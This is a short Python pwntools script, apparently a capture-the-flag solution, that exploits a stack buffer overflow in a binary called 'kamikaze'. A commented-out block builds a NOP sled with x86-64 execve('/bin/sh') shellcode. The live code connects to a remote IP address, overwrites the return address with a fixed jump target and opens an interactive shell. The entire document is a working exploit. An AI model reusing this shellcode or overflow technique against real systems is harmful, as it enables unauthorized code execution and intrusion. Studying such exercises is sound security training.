from pwn import *
import string

"""
p=process("./kamikaze")

payload=""
payload+="A"*10
payload+="B"*8
payload+="\x90"*300
payload+="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print payload
"""

p=remote("13.48.67.196",50000)

payload="A"*10
payload+=p64(0x0000000000400807)

print p.recv()
p.sendline(payload);
p.interactive()

